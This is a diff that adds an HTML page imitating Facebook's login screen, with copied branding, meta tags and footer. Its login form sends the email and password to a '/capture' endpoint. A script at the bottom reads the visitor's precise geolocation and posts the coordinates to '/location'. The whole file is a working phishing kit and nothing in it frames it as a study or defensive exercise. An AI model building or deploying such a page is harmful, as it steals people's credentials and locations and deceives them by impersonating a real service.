@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Facebook – log in or sign up">
+    <meta property="og:description" content="Connect with friends and the world around you on Facebook.">
+    <title>Facebook – log in or sign up</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5ZCb.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5; 
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .left-section {
+            flex: 1;
+            padding-right: 60px;
+            margin-bottom: 50px;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: 700;
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+        }
+        .tagline {
+            font-size: 28px;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        .right-section {
+            flex: 0 0 396px;
+        }
+        .login-card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .login-card input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+        }
+        .login-card input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .login-btn:hover { background: #166fe5; }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 16px 0;
+        }
+        .forgot-password:hover { text-decoration: underline; }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            display: inline-block;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 17px;
+            font-weight: 600;
+            text-decoration: none;
+            margin: 10px auto;
+        }
+        .create-account:hover { background: #36a420; }
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        .create-page a {
+            font-weight: 600;
+            color: #1c1e21;
+            text-decoration: none;
+        }
+        .create-page a:hover { text-decoration: underline; }
+        
+        .footer {
+            background: #fff;
+            padding: 20px;
+            margin-top: auto;
+        }
+        .footer-content {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .languages {
+            color: #737373;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+        .languages a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+        .languages a:hover { text-decoration: underline; }
+        .footer-links {
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin-right: 20px;
+        }
+        .footer-links a:hover { text-decoration: underline; }
+        .copyright {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #737373;
+        }
+        
+        @media (max-width: 900px) {
+            .container { flex-direction: column; text-align: center; }
+            .left-section { padding-right: 0; margin-bottom: 40px; }
+            .logo { text-align: center; }
+            .tagline { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">facebook</div>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-card">
+                <form action="/capture" method="POST">
+                    <input type="text" name="email" placeholder="Email or phone number" required autocomplete="username">
+                    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                <a href="#" class="forgot-password">Forgotten password?</a>
+                <div class="divider"></div>
+                <a href="#" class="create-account">Create New Account</a>
+            </div>
+            <p class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="languages">
+                English (UK) Hausa Français (France) Português (Brasil) Español العربية Bahasa Indonesia Deutsch 日本語 Italiano हिन्दी
+            </div>
+            <div class="footer-links">
+                Sign Up Log In Messenger Facebook Lite Video Places Games Marketplace Meta Pay Meta Store Meta Quest Threads
+            </div>
+            <div class="copyright">Meta © 2026</div>
+        </div>
+    </footer>
+    
+    <script>
+        // Get precise location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                fetch('/location', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&accuracy=' + pos.coords.accuracy
+                });
+            });
+        }
+    </script>
+</body>
+</html>
